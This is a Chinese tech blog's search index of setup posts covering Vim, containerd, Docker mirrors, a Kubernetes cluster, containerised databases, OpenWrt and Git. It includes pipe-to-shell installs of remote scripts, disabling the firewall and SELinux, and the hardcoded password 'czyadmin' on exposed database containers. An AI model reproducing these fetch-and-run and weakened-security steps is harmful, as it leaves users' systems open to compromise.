安装 git clone https://gitee.com/colzry/SimpleVim.git git clone https://github.com/Colzry/SimpleVim.git cd SimpleVim/ bash install.sh 卸载 cd ~/simple-vim/ bash uninstall.sh 使用 vv或者kj 退出插入模式 Ctrl+a	全选 U	光标向下移动5行=5j E	光标向上移动5行=5k =	查找模式时，下一个匹配值 -	查找模式时，上一个匹配值 &lt;Leader&gt;+1	移动到行首 &lt;Leader&gt;+0	移动到行尾 S	保存文件 Q 退出vim编辑器 R	刷新vimrc文件 s]	水平向右分割窗口 s[ 水平向左分割窗口 sk	垂直向上分割窗口 sj	垂直向下分割窗口 &lt;Leader&gt;+h	光标移动到左窗口 &lt;Leader&gt;+l	光标移动到右窗口 &lt;Leader&gt;+j	光标移动到下窗口 &lt;Leader&gt;+k	光标移动到上窗口 &lt;Leader&gt;+↑	光标所在窗口向上拉长 &lt;Leader&gt;+↓	光标所在窗口向下拉长 &lt;Leader&gt;+←	光标所在窗口向左拉长 &lt;Leader&gt;+→	光标所在窗口向右拉长 &lt;Leader&gt;+w	删除光标所在单词 &lt;Leader&gt;+u	向下翻半屏 &lt;Leader&gt;+d	向上翻半屏 &lt;Leader&gt;+n	打开文件树形结构列表 &lt;Leader&gt;+m	查看文件函数列表 { 光标向上移动一个代码块 } 光标向下移动一个代码块 di( 删除括号里的内容 di{ 删除花括号里的内容 :e 文档名 进入vim后，不离开 vim 的情形下打开其他文档 :files 或 :buffers 或 :ls 可以列出目前 缓冲区 中的所有文档。加号 + 表示 缓冲区已经被修改过了。＃代表上一次编辑的文档，%是目前正在编辑中的文档 :b 文档名或编号 移至该文档 &lt;Leader&gt;+cc	注释当前行 &lt;Leader&gt;+cu	取消注释   ]]></content></entry><entry><title>Containerd安装</title><url>/posts/docker/containerd%E5%AE%89%E8%A3%85/</url><categories><category>Docker</category></categories><tags><tag>Docker</tag></tags><content type="html"><![CDATA[  官方下载地址：https://github.com/containerd/containerd/releases
wget https://github.com/containerd/containerd/releases/download/v1.6.8/cri-containerd-cni-1.6.8-linux-amd64.tar.gz mkdir cri-containerd-cni &amp;&amp; tar -zxvf cri-containerd-cni-1.6.8-linux-amd64.tar.gz -C cri-containerd-cni 复制配置文件
cp cri-containerd-cni/etc/crictl.yaml /etc/ cp cri-containerd-cni/etc/systemd/system/containerd.service /etc/systemd/system/ # 复制 containerd 和相关依赖 cp cri-containerd-cni/usr/local/bin/. /usr/local/bin/ -a # 复制runc文件 cp cri-containerd-cni/usr/local/sbin/. /usr/local/sbin/ -a 生成和配置启动文件 # 1. 创建文件夹 mkdir -p /etc/containerd # 2. 生成配置文件 containerd config default &gt; /etc/containerd/config.toml vim /etc/containerd/config.toml disabled_plugins = [] imports = [] oom_score = 0 plugin_dir = &#34;&#34; required_plugins = [] root = &#34;/var/lib/containerd&#34; state = &#34;/run/containerd&#34; version = 2 [cgroup] path = &#34;&#34; [debug] address = &#34;&#34; format = &#34;&#34; gid = 0 level = &#34;&#34; uid = 0 [grpc] address = &#34;/run/containerd/containerd.sock&#34; gid = 0 max_recv_message_size = 16777216 max_send_message_size = 16777216 tcp_address = &#34;&#34; tcp_tls_cert = &#34;&#34; tcp_tls_key = &#34;&#34; uid = 0 [metrics] address = &#34;&#34; grpc_histogram = false [plugins] [plugins.&#34;io.containerd.gc.v1.scheduler&#34;] deletion_threshold = 0 mutation_threshold = 100 pause_threshold = 0.02 schedule_delay = &#34;0s&#34; startup_delay = &#34;100ms&#34; [plugins.&#34;io.containerd.grpc.v1.cri&#34;] disable_apparmor = false disable_cgroup = false disable_hugetlb_controller = true disable_proc_mount = false disable_tcp_service = true enable_selinux = false enable_tls_streaming = false ignore_image_defined_volumes = false max_concurrent_downloads = 3 max_container_log_line_size = 16384 netns_mounts_under_state_dir = false restrict_oom_score_adj = false # sandbox_image = &#34;k8s.gcr.io/pause:3.5&#34; # 1. 修改基础镜像地址 sandbox_image = &#34;registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.5&#34; selinux_category_range = 1024 stats_collect_period = 10 stream_idle_timeout = &#34;4h0m0s&#34; stream_server_address = &#34;127.0.0.1&#34; stream_server_port = &#34;0&#34; systemd_cgroup = false tolerate_missing_hugetlb_controller = true unset_seccomp_profile = &#34;&#34; [plugins.&#34;io.containerd.grpc.v1.cri&#34;.cni] bin_dir = &#34;/opt/cni/bin&#34; conf_dir = &#34;/etc/cni/net.d&#34; conf_template = &#34;&#34; max_conf_num = 1 [plugins.&#34;io.containerd.grpc.v1.cri&#34;.containerd] default_runtime_name = &#34;runc&#34; disable_snapshot_annotations = true discard_unpacked_layers = false no_pivot = false snapshotter = &#34;overlayfs&#34; [plugins.&#34;io.containerd.grpc.v1.cri&#34;.containerd.default_runtime] base_runtime_spec = &#34;&#34; container_annotations = [] pod_annotations = [] privileged_without_host_devices = false runtime_engine = &#34;&#34; runtime_root = &#34;&#34; runtime_type = &#34;&#34; [plugins.&#34;io.containerd.grpc.v1.cri&#34;.containerd.default_runtime.options] [plugins.&#34;io.containerd.grpc.v1.cri&#34;.containerd.runtimes] [plugins.&#34;io.containerd.grpc.v1.cri&#34;.containerd.runtimes.runc] base_runtime_spec = &#34;&#34; container_annotations = [] pod_annotations = [] privileged_without_host_devices = false runtime_engine = &#34;&#34; runtime_root = &#34;&#34; runtime_type = &#34;io.containerd.runc.v2&#34; [plugins.&#34;io.containerd.grpc.v1.cri&#34;.containerd.runtimes.runc.options] BinaryName = &#34;&#34; CriuImagePath = &#34;&#34; CriuPath = &#34;&#34; CriuWorkPath = &#34;&#34; IoGid = 0 IoUid = 0 NoNewKeyring = false NoPivotRoot = false Root = &#34;&#34; ShimCgroup = &#34;&#34; SystemdCgroup = false [plugins.&#34;io.containerd.grpc.v1.cri&#34;.containerd.untrusted_workload_runtime] base_runtime_spec = &#34;&#34; container_annotations = [] pod_annotations = [] privileged_without_host_devices = false runtime_engine = &#34;&#34; runtime_root = &#34;&#34; runtime_type = &#34;&#34; [plugins.&#34;io.containerd.grpc.v1.cri&#34;.containerd.untrusted_workload_runtime.options] [plugins.&#34;io.containerd.grpc.v1.cri&#34;.image_decryption] key_model = &#34;node&#34; [plugins.&#34;io.containerd.grpc.v1.cri&#34;.registry] config_path = &#34;&#34; [plugins.&#34;io.containerd.grpc.v1.cri&#34;.registry.auths] [plugins.&#34;io.containerd.grpc.v1.cri&#34;.registry.configs] [plugins.&#34;io.containerd.grpc.v1.cri&#34;.registry.headers] [plugins.&#34;io.containerd.grpc.v1.cri&#34;.registry.mirrors] # 2. 设置仓库地址 [plugins.&#34;io.containerd.grpc.v1.cri&#34;.registry.mirrors.&#34;docker.io&#34;] endpoint = [&#34;https://usydjf4t.mirror.aliyuncs.com&#34;] [plugins.&#34;io.containerd.grpc.v1.cri&#34;.registry.mirrors.&#34;k8s.gcr.io&#34;] endpoint = [&#34;https://registry.cn-hangzhou.aliyuncs.com/google_containers&#34;] [plugins.&#34;io.containerd.grpc.v1.cri&#34;.x509_key_pair_streaming] tls_cert_file = &#34;&#34; tls_key_file = &#34;&#34; [plugins.&#34;io.containerd.internal.v1.opt&#34;] path = &#34;/opt/containerd&#34; [plugins.&#34;io.containerd.internal.v1.restart&#34;] interval = &#34;10s&#34; [plugins.&#34;io.containerd.metadata.v1.bolt&#34;] content_sharing_policy = &#34;shared&#34; [plugins.&#34;io.containerd.monitor.v1.cgroups&#34;] no_prometheus = false [plugins.&#34;io.containerd.runtime.v1.linux&#34;] no_shim = false runtime = &#34;runc&#34; runtime_root = &#34;&#34; shim = &#34;containerd-shim&#34; shim_debug = false [plugins.&#34;io.containerd.runtime.v2.task&#34;] platforms = [&#34;linux/amd64&#34;] [plugins.&#34;io.containerd.service.v1.diff-service&#34;] default = [&#34;walking&#34;] [plugins.&#34;io.containerd.snapshotter.v1.aufs&#34;] root_path = &#34;&#34; [plugins.&#34;io.containerd.snapshotter.v1.btrfs&#34;] root_path = &#34;&#34; [plugins.&#34;io.containerd.snapshotter.v1.devmapper&#34;] async_remove = false base_image_size = &#34;&#34; pool_name = &#34;&#34; root_path = &#34;&#34; [plugins.&#34;io.containerd.snapshotter.v1.native&#34;] root_path = &#34;&#34; [plugins.&#34;io.containerd.snapshotter.v1.overlayfs&#34;] root_path = &#34;&#34; [plugins.&#34;io.containerd.snapshotter.v1.zfs&#34;] root_path = &#34;&#34; [proxy_plugins] [stream_processors] [stream_processors.&#34;io.containerd.ocicrypt.decoder.v1.tar&#34;] accepts = [&#34;application/vnd.oci.image.layer.v1.tar+encrypted&#34;] args = [&#34;--decryption-keys-path&#34;, &#34;/etc/containerd/ocicrypt/keys&#34;] env = [&#34;OCICRYPT_KEYPROVIDER_CONFIG=/etc/containerd/ocicrypt/ocicrypt_keyprovider.conf&#34;] path = &#34;ctd-decoder&#34; returns = &#34;application/vnd.oci.image.layer.v1.tar&#34; [stream_processors.&#34;io.containerd.ocicrypt.decoder.v1.tar.gzip&#34;] accepts = [&#34;application/vnd.oci.image.layer.v1.tar+gzip+encrypted&#34;] args = [&#34;--decryption-keys-path&#34;, &#34;/etc/containerd/ocicrypt/keys&#34;] env = [&#34;OCICRYPT_KEYPROVIDER_CONFIG=/etc/containerd/ocicrypt/ocicrypt_keyprovider.conf&#34;] path = &#34;ctd-decoder&#34; returns = &#34;application/vnd.oci.image.layer.v1.tar+gzip&#34; [timeouts] &#34;io.containerd.timeout.shim.cleanup&#34; = &#34;5s&#34; &#34;io.containerd.timeout.shim.load&#34; = &#34;5s&#34; &#34;io.containerd.timeout.shim.shutdown&#34; = &#34;3s&#34; &#34;io.containerd.timeout.task.state&#34; = &#34;2s&#34; [ttrpc] address = &#34;&#34; gid = 0 uid = 0 启动 systemctl daemon-reload systemctl enable containerd --now systemctl status containerd   ]]></content></entry><entry><title>Docker换源</title><url>/posts/docker/%E6%8D%A2%E6%BA%90/</url><categories><category>Docker</category></categories><tags><tag>Docker</tag></tags><content type="html"><![CDATA[  Podman换源 网易 hub-mirror.c.163.com USTC docker.mirrors.ustc.edu.cn vim /etc/containers/registries.conf ################################################ unqualified-search-registries = [&#34;docker.io&#34;] [[registry]] prefix = &#34;docker.io&#34; location = &#34;l6p4ic76.mirror.aliyuncs.com&#34; ################################################# Docker换源 vim /etc/docker/daemon.json { &#34;registry-mirrors&#34;: [&#34;https://l6p4ic76.mirror.aliyuncs.com&#34;], &#34;log-driver&#34;:&#34;json-file&#34;, &#34;log-opts&#34;: {&#34;max-size&#34;:&#34;500m&#34;, &#34;max-file&#34;:&#34;3&#34;} } systemctl restart docker &gt; 南京大学 https://docker.nju.edu.cn/ &gt; 网易 http://hub-mirror.c.163.com &gt; 腾讯云 docker hub mirror https://mirror.ccs.tencentyun.com &gt; docker中国 https://registry.docker-cn.com &gt; 我的 daocloud http://f1361db2.m.daocloud.io &gt; 我的华为云 https://326fcbdbb5c7487aa2d8180833e71119.mirror.swr.myhuaweicloud.com ) 我的阿里云 https://l6p4ic76.mirror.aliyuncs.com 查看镜像源 docker info podman info   ]]></content></entry><entry><title>K8S集群部署</title><url>/posts/docker/k8s%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2/</url><categories><category>Docker</category></categories><tags><tag>Docker</tag></tags><content type="html"><![CDATA[  官网地址：https://kubernetes.io/zh-cn/docs/setup/production-environment/tools/kubeadm/
1. 搭建单Master集群 创建一个 Master 节点 kubeadm init 将 Node节点加入到当前集群中 kubeadm join &amp;lt;Master节点的IP和端口&amp;gt; 环境准备 工作节点 主机名 IP地址 系统版本 master k8s-master 192.168.211.201 almalinux8.6 node1 k8s-node1 192.168.211.202 almalinux8.6 node2 k8s-node2 192.168.211.203 almalinux8.6 注意： 从 2 - 5 的内容在在master和node节点主机在都要执行
2. 安装前准备 2.1 修改和添加主机名 # 修改主机名 # 在master节点执行 hostnamectl set-hostname k8s-master # 在node节点执行 hostnamectl set-hostname k8s-node1 hostnamectl set-hostname k8s-node2 # 添加主机名 cat &amp;gt;&amp;gt; /etc/hosts &amp;lt;&amp;lt; EOF 192.168.211.201 k8s-master 192.168.211.202 k8s-node1 192.168.211.203 k8s-node2 EOF 2.2 关闭防火墙 systemctl stop firewalld systemctl disable firewalld 2.3 关闭 selinux sed -i &amp;#39;s/SELINUX=enforcing/SELINUX=disabled/g&amp;#39; /etc/sysconfig/selinux setenforce 0 2.4 关闭swap分区 先临时关闭，再永久关闭，这样就不用重启 # 临时关闭 swapoff -a # 永久关闭 sed -ri &amp;#39;s/.*swap.*/#&amp;amp;/&amp;#39; /etc/fstab # 重启生效 # 查看效果 free -m # 重新启动swap分区 swapon -a 2.5 网桥过滤 cat …  ]]></content></entry><entry><title>安装Docker</title><url>/posts/docker/%E5%AE%89%E8%A3%85docker/</url><categories><category>Docker</category></categories><tags><tag>Docker</tag></tags><content type="html"> 1. 命令行安装 1.1 卸载旧版本 yum remove docker \ docker-client \ docker-client-latest \ docker-common \ docker-latest \ docker-latest-logrotate \ docker-logrotate \ docker-selinux \ docker-engine-selinux \ docker-engine 1.2 安装 执行以下命令安装依赖包：
yum install -y yum-utils 鉴于国内网络问题，强烈建议使用国内源，官方源请在注释中查看。 执行下面的命令添加 yum 软件源：
yum-config-manager \ --add-repo \ https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo # 官方源 # yum-config-manager \ # --add-repo \ # https://download.docker.com/linux/centos/docker-ce.repo 更新 yum 软件源缓存，并安装 docker-ce
yum makecache yum install docker-ce docker-ce-cli containerd.io docker-scan-plugin docker-compose-plugin docker-ce-rootless-extras 1.3 防火墙额外设置 由于 CentOS8 防火墙使用了 nftables，但 Docker 尚未支持 nftables， 我们可以使用如下设置使用 iptables：
更改 vim /etc/firewalld/firewalld.conf
# FirewallBackend=nftables FirewallBackend=iptables 或者执行如下命令：
firewall-cmd --permanent --zone=trusted --add-interface=docker0 firewall-cmd --reload 2. 使用脚本自动安装 curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun 3. 启动Docker systemctl enable docker systemctl start docker</content></entry><entry><title>使用Docker安装常用环境</title><url>/posts/docker/%E4%BD%BF%E7%94%A8docker%E5%AE%89%E8%A3%85%E5%B8%B8%E7%94%A8%E7%8E%AF%E5%A2%83/</url><categories><category>Docker</category></categories><tags><tag>Docker</tag></tags><content type="html"><![CDATA[  安装Docker $ curl -fsSL get.docker.com -o get-docker.sh $ sudo sh get-docker.sh --mirror Aliyun 卸载
dnf remove -y -q docker-ce docker-ce-cli containerd.io docker-scan-plugin docker-compose-plugin docker-ce-rootless-extras rm -rf 启动 Docker $ sudo systemctl enable docker $ sudo systemctl start docker 建立 docker 用户组 默认情况下，docker 命令会使用 Unix socket 与 Docker 引擎通讯。而只有 root 用户和 docker 组的用户才可以访问 Docker 引擎的 Unix socket。出于安全考虑，一般 Linux 系统上不会直接使用 root 用户。因此，更好地做法是将需要使用 docker 的用户加入 docker 用户组。
建立 docker 组：
$ sudo groupadd docker 将当前用户加入 docker 组：
$ sudo usermod -aG docker $USER 注销用户或者重启系统 更换镜像源 vim /etc/docker/daemon.json {&#34;registry-mirrors&#34;: [&#34;http://hub-mirror.c.163.com&#34;]} systemctl restart docker 2) 腾讯云 docker hub mirror https://mirror.ccs.tencentyun.com 3) 华为云 https://05f073ad3c0010ea0f4bc00b7105ec20.mirror.swr.myhuaweicloud.com 4) docker中国 https://registry.docker-cn.com 5) 网易 http://hub-mirror.c.163.com 6) daocloud http://f1361db2.m.daocloud.io 安装Docker图形化界面 #下载 Docker 图形化界面 portainer sudo docker pull portainer/portainer #创建 portainer 容器 sudo docker volume create portainer_data #运行 portainer sudo docker run -d \ -p 9000:9000 \ --name portainer \ --restart always \ -v /var/run/docker.sock:/var/run/docker.sock \ -v portainer_data:/data \ portainer/portainer 安装MySql //拉取MySQL镜像 docker pull mysql //启动MySQL，注意更改密码，用户名为root，密码czyadmin docker run -d \ --name mysql \ --restart=always \ -p 3306:3306 \ -e MYSQL_ROOT_PASSWORD=czyadmin \ mysql 安装Redis //拉取Redis镜像 docker pull redis //启动Redis，注意更改密码，用户名为root，密码czyadmin docker run -d \ --name redis \ --restart=always \ -p 6379:6379 \ redis \ --requirepass &#34;czyadmin&#34; 安装Nginx 拉取镜像
docker pull nginx 创建本地配置文件
mkdir -p /etc/nginx/conf.d &amp;&amp; vim /etc/nginx/nginx.conf user nginx; worker_processes auto; error_log /var/log/nginx/error.log notice; pid /var/run/nginx.pid; events { worker_connections 1024; } http { include /etc/nginx/mime.types; default_type application/octet-stream; log_format main &#39;$remote_addr - $remote_user [$time_local] &#34;$request&#34; &#39; &#39;$status $body_bytes_sent &#34;$http_referer&#34; &#39; &#39;&#34;$http_user_agent&#34; &#34;$http_x_forwarded_for&#34;&#39;; access_log /var/log/nginx/access.log main; sendfile on; #tcp_nopush on; keepalive_timeout 65; #gzip on; include /etc/nginx/conf.d/*.conf; } 启动服务
//启动nginx，映射本地配置文件 docker run -d \ --name nginx \ --restart=always \ -p 80:80 \ -v /etc/nginx/nginx.conf:/etc/nginx/nginx.conf \ -v /etc/nginx/conf.d:/etc/nginx/conf.d \ nginx vim /etc/nginx/conf.d/demo.conf server { listen 80; listen [::]:80; server_name localhost; location / { root /usr/share/nginx/html; index index.html index.htm; } } docker exec nginx bash -c &#39;nginx -s reload&#39; 安装RabbitMQ docker pull rabbitmq:management 默认用户名和密码：guest/guest
docker run -dit \ --name rabbitmq \ --restart=always \ -p 5672:5672 \ -p 15672:15672 \ rabbitmq:management 端口 作用 15672 管理界面UI的使用端口 15671 管理监听端口 5672,5671 AMQP 0-9-1 without and with TLSclient端通信口 4369 (epmd)epmd代表Erlang端口映射守护进程，erlang发现口 25672 ( Erlang distribution) server间内部通信口 安装Postgresql docker pull postgres docker run -d \ --name postgres \ --restart=always \ -p 5432:5432 \ -e POSTGRES_PASSWORD=czyadmin \ postgres 用户名：postgres	密码：czyadmin
  ]]></content></entry><entry><title>树莓派使用Docker安装openwrt作为旁路由(网关服务器)</title><url>/posts/docker/%E6%A0%91%E8%8E%93%E6%B4%BE%E4%BD%BF%E7%94%A8docker%E5%AE%89%E8%A3%85openwrt%E4%BD%9C%E4%B8%BA%E6%97%81%E8%B7%AF%E7%94%B1%E7%BD%91%E5%85%B3%E6%9C%8D%E5%8A%A1%E5%99%A8/</url><categories><category>Docker</category></categories><tags><tag>Docker</tag><tag>树莓派</tag></tags><content type="html">
推荐使用 树莓派爱好基地的arm64无桌面增强版镜像
仓库地址： https://github.com/openfans-community-offical/Debian-Pi-Aarch64/blob/master/README_zh.md 仓库中有详细的说明文档和下载地址
开始安装openwrt容器 树莓派爱好基地的arm64无桌面增强版自带docker，可以直接使用
1. 打开网卡混杂模式 sudo ip link set eth0 promisc on 2. 创建macvlan虚拟网络，同一网段下的主机才能访问容器 下面的网段(subnet)和网关(gateway)选项请结合实际自行更改
docker network create -d macvlan --subnet=192.168.0.0/24 --gateway=192.168.0.1 -o parent=eth0 macnet 此时，我们使用 docker network ls命令可以看到网络macnet已建立成功：
pi@raspbian:~$ docker network ls NETWORK ID NAME DRIVER SCOPE 7b8e38d3dd3c bridge bridge local f96e6360c248 host host local 7c7a5a51b268 macnet macvlan local c8c6782b8e1e none null local 3. 拉取openwrt镜像 docker pull registry.cn-shanghai.aliyuncs.com/suling/openwrt:rpi4 镜像拉取完成后，我们可以执行docker images命令查看现存镜像：
docker images REPOSITORY TAG IMAGE ID CREATED SIZE registry.cn-shanghai.aliyuncs.com/suling/openwrt rpi4 c3ba4d17a20e 32 hours ago 455MB 4. 创建并启动容器 docker run --restart always --name openwrt -d --network macnet --privileged --ip 192.168.0.200 …</content></entry><entry><title>初次安装Git的配置</title><url>/posts/git/%E5%88%9D%E6%AC%A1%E5%AE%89%E8%A3%85git%E7%9A%84%E9%85%8D%E7%BD%AE/</url><categories><category>Git</category></categories><tags><tag>Git</tag></tags><content type="html"> 初次运行 Git 前的配置 Git 自带一个 git config 的工具来帮助设置控制 Git 外观和行为的配置变量。 这些变量存储在三个不同的位置：
/etc/gitconfig 文件: 包含系统上每一个用户及他们仓库的通用配置。 如果在执行 git config 时带上 --system 选项，那么它就会读写该文件中的配置变量。 （由于它是系统配置文件，因此你需要管理员或超级用户权限来修改它。） ~/.gitconfig 或 ~/.config/git/config 文件：只针对当前用户。 你可以传递 --global 选项让 Git 读写此文件，这会对你系统上 所有 的仓库生效。 当前使用仓库的 Git 目录中的 config 文件（即 .git/config）：针对该仓库。 你可以传递 --local 选项让 Git 强制读写此文件，虽然默认情况下用的就是它。。 （当然，你需要进入某个 Git 仓库中才能让该选项生效。） 每一个级别会覆盖上一级别的配置，所以 .git/config 的配置变量会覆盖 /etc/gitconfig 中的配置变量。
在 Windows 系统中，Git 会查找 $HOME 目录下（一般情况下是 C:\Users\$USER ）的 .gitconfig 文件。 Git 同样也会寻找 /etc/gitconfig 文件，但只限于 MSys 的根目录下，即安装 Git 时所选的目标位置。 如果你在 Windows 上使用 Git 2.x 以后的版本，那么还有一个系统级的配置文件，Windows XP 上在 C:\Documents and Settings\All Users\Application Data\Git\config ，Windows Vista 及更新的版本在 C:\ProgramData\Git\config 。此文件只能以管理员权限通过 git config -f &amp;amp;lt;file&amp;amp;gt; 来修改。
你可以通过以下命令查看所有的配置以及它们所在的文件：
$ git config --list --show-origin 用户信息 安装完 Git 之后，要做的第一件事就是设置你的用户名和邮件地址。 这一点很重要，因为每一个 Git 提交都会使用这些信息，它们会写入到你的每一次提交中，不可更改：
$ git …</content></entry></search>